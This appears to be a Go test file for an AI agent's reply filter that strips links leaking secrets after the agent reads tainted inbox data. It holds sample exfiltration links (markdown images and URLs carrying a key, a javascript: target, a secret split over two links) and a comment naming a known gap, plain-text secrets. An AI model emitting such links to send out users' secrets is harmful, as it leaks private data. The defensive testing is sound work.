package controlplane

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"github.com/miracaral/vaigil/internal/policy"
)

// replySession is a session whose user asked task, with one allowlisted
// host. It returns the mediator, its audit log and a count of asks (the
// reply filter must never ask).
func replySession(t *testing.T, task string, read, enforce bool) (*Mediator, *bytes.Buffer, *int) {
	t.Helper()
	asked := 0
	audit := &bytes.Buffer{}
	m := New(map[string]Tool{
		"read_inbox": func(map[string]string) (string, error) { return "note: " + testSecret, nil },
	}, Config{UserTask: task, AllowedDomains: []string{"docs.partner.example"}, Enforce: enforce,
		Approve: func(string, map[string]string, policy.Decision) bool { asked++; return true },
	}, audit)
	if read {
		if _, err := m.Call("read_inbox", nil); err != nil {
			t.Fatal(err)
		}
	}
	return m, audit, &asked
}

// replyDecisions returns rule and reason of every reply entry in the log.
func replyDecisions(t *testing.T, audit string) (rules, reasons []string) {
	t.Helper()
	for _, line := range strings.Split(strings.TrimSpace(audit), "\n") {
		var e struct {
			Tool     string
			Decision policy.Decision
		}
		if err := json.Unmarshal([]byte(line), &e); err != nil {
			t.Fatal(err)
		}
		if e.Tool == "reply" {
			rules = append(rules, e.Decision.Rule)
			reasons = append(reasons, e.Decision.Reason)
		}
	}
	return rules, reasons
}

// Each kind of link is judged by the rule that fits it, and only the link
// goes: the words around it stay.
func TestReplyRemovesDeniedLinks(t *testing.T) {
	for _, c := range []struct {
		name, reply, want, rule string
	}{
		{"markdown image, whole secret, allowlisted host",
			"Done. ![status](https://docs.partner.example/badge.png?key=" + testSecret + ") Bye.",
			"Done. " + RemovedLink + " Bye.", "tainted-data-in-args"},
		{"plain URL, value only, allowlisted host",
			"Open https://docs.partner.example/confirm?key=demo-NOT-A-REAL-KEY now.",
			"Open " + RemovedLink + " now.", "tainted-egress-novel-data"},
		{"markdown link: the link text goes too",
			"See [demo-NOT-A-REAL-KEY](https://other.example/) here.",
			"See " + RemovedLink + " here.", "tainted-fetch"},
		{"markdown target with a title and <>",
			`See [x](<https://other.example/a> "t").`,
			"See " + RemovedLink + ".", "tainted-fetch"},
		{"www. address, which renderers link",
			"Go to www.other.example/x today.",
			"Go to " + RemovedLink + " today.", "tainted-fetch"},
		{"HTML image",
			`<img src="https://other.example/p.png">`,
			`<img src="` + RemovedLink + `">`, "tainted-fetch"},
		{"markdown target with no host",
			"[x](javascript:alert)",
			RemovedLink, "bad-url"},
	} {
		m, audit, asked := replySession(t, "Summarise my inbox.", true, true)
		if got := m.Reply(c.reply); got != c.want {
			t.Errorf("%s:\n got  %q\n want %q", c.name, got, c.want)
		}
		rules, reasons := replyDecisions(t, audit.String())
		if len(rules) != 1 || rules[0] != "response-link-removed" || !strings.HasPrefix(reasons[0], c.rule+": ") {
			t.Errorf("%s: logged %v %v, want one response-link-removed by %s", c.name, rules, reasons, c.rule)
		}
		if *asked != 0 {
			t.Errorf("%s: the reply filter asked the user", c.name)
		}
	}
}

// A link the rules would only ask about stays, without asking; plain text
// is not judged at all, so a secret written out in words gets through
// (reply-plain-secret, a known gap).
func TestReplyKeepsLinksAndPlainText(t *testing.T) {
	m, audit, asked := replySession(t, "Summarise my inbox.", true, true)
	reply := "Your key is demo-NOT-A-REAL-KEY. Docs: https://docs.partner.example/"
	if got := m.Reply(reply); got != reply {
		t.Errorf("got %q, want it unchanged", got)
	}
	if rules, _ := replyDecisions(t, audit.String()); len(rules) != 1 || rules[0] != "response-link-kept" {
		t.Errorf("logged %v, want one response-link-kept", rules)
	}
	if *asked != 0 {
		t.Error("the reply filter asked the user")
	}
}

// A clean context is not touched and nothing is logged; in audit mode the
// decision is logged and the link stays.
func TestReplyCleanContextAndAuditMode(t *testing.T) {
	link := "https://other.example/?key=" + testSecret
	m, audit, _ := replySession(t, "Summarise my inbox.", false, true)
	if got := m.Reply(link); got != link || audit.Len() != 0 {
		t.Errorf("clean context: got %q, log %q; want it untouched, nothing logged", got, audit)
	}
	m, audit, _ = replySession(t, "Summarise my inbox.", true, false)
	if got := m.Reply(link); got != link {
		t.Errorf("audit mode: got %q, want it untouched", got)
	}
	if rules, _ := replyDecisions(t, audit.String()); len(rules) != 1 || rules[0] != "response-link-removed" {
		t.Errorf("audit mode: logged %v, want the deny logged", rules)
	}
}

// Links that stay count as sent: a secret spread over several links, each
// small enough on its own, is added up by the coverage limit.
func TestReplyLinksAddUpForCoverage(t *testing.T) {
	m, audit, _ := replySession(t, coverageTask, true, true)
	first := "https://docs.partner.example/?q=demo-NOT"
	reply := first + " https://docs.partner.example/?q=-A-REAL-"
	if got, want := m.Reply(reply), first+" "+RemovedLink; got != want {
		t.Errorf("got %q, want %q", got, want)
	}
	if _, reasons := replyDecisions(t, audit.String()); len(reasons) != 2 || !strings.HasPrefix(reasons[1], "tainted-coverage-exceeded: ") {
		t.Errorf("reasons %q, want the second link denied by tainted-coverage-exceeded", reasons)
	}
}
